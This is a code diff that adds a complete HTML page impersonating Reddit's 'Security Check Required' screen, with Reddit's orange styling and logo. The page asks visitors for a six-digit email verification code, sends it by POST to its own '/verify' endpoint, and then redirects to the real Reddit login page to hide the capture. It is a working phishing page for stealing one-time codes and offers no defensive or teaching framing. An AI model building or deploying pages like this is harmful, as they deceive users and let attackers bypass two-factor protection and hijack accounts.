@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>reddit.com: security check</title>
+    <style>
+        :root {
+            --reddit-orange: #FF4500;
+            --reddit-orange-hover: #E03D00;
+            --background-color: #DAE0E6;
+            --text-color: #1A1A1B;
+            --secondary-text: #7C7C7C;
+            --border-color: #EDEFF1;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: IBMPlexSans, Arial, sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .reddit-logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .reddit-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: var(--reddit-orange);
+        }
+
+        .verification-box {
+            background: white;
+            border-radius: 4px;
+            padding: 32px 24px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: 500;
+            margin-bottom: 12px;
+            text-align: center;
+            color: var(--text-color);
+        }
+
+        p {
+            color: var(--secondary-text);
+            margin-bottom: 24px;
+            font-size: 14px;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .otp-container {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 24px;
+            justify-content: center;
+        }
+
+        .otp-input {
+            width: 40px;
+            height: 48px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: 500;
+            background: white;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: var(--reddit-orange);
+            box-shadow: 0 0 0 2px rgba(255, 69, 0, 0.2);
+        }
+
+        button {
+            background: var(--reddit-orange);
+            color: white;
+            border: none;
+            border-radius: 999px;
+            padding: 12px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        button:hover {
+            background: var(--reddit-orange-hover);
+        }
+
+        .resend {
+            text-align: center;
+            font-size: 12px;
+            color: var(--secondary-text);
+        }
+
+        .resend a {
+            color: var(--reddit-orange);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .resend a:hover {
+            text-decoration: underline;
+        }
+
+        #timer {
+            color: var(--secondary-text);
+            font-size: 12px;
+        }
+
+        #combinedOTP {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="reddit-logo">
+            <svg viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                <path d="M10 19.5C4.75 19.5.5 15.25.5 10S4.75.5 10 .5s9.5 4.25 9.5 9.5-4.25 9.5-9.5 9.5zm3.968-12.377c.72 0 1.303.583 1.303 1.303 0 .72-.583 1.303-1.303 1.303-.72 0-1.303-.583-1.303-1.303 0-.72.583-1.303 1.303-1.303zm-7.936 0c.72 0 1.303.583 1.303 1.303 0 .72-.583 1.303-1.303 1.303-.72 0-1.303-.583-1.303-1.303 0-.72.583-1.303 1.303-1.303zM10 15.5c-2.5 0-4.5-1.5-4.5-3.5s2-3.5 4.5-3.5 4.5 1.5 4.5 3.5-2 3.5-4.5 3.5z"/>
+            </svg>
+        </div>
+        <div class="verification-box">
+            <h1>Security Check Required</h1>
+            <p>For your security, we sent a verification code to your email. Please enter the 6-digit code below to continue.</p>
+            
+            <form action="/verify" method="POST" id="otpForm">
+                <div class="otp-container">
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                    <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" required>
+                </div>
+                <input type="hidden" id="combinedOTP" name="otp">
+                <button type="submit">Verify</button>
+            </form>
+            
+            <div class="resend">
+                <span id="timer">Resend code in: 30s</span><br>
+                <a href="#" id="resendLink" style="display: none;">Send new code</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Handle OTP input
+        const otpInputs = document.querySelectorAll('.otp-input');
+        const combinedOTP = document.getElementById('combinedOTP');
+        const form = document.getElementById('otpForm');
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1) {
+                    if (index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    otpInputs[index - 1].focus();
+                }
+            });
+        });
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            combinedOTP.value = otp;
+            
+            // Submit form and redirect
+            fetch('/verify', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ otp: otp })
+            })
+            .then(response => response.json())
+            .then(data => {
+                window.location.href = 'https://www.reddit.com/login';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+
+        // Timer functionality
+        let timeLeft = 30;
+        const timerElement = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+
+        const updateTimer = () => {
+            if (timeLeft > 0) {
+                timerElement.textContent = `Resend code in: ${timeLeft}s`;
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        };
+
+        updateTimer();
+
+        resendLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            timeLeft = 30;
+            timerElement.style.display = 'inline';
+            resendLink.style.display = 'none';
+            updateTimer();
+        });
+    </script>
+</body>
+</html> 
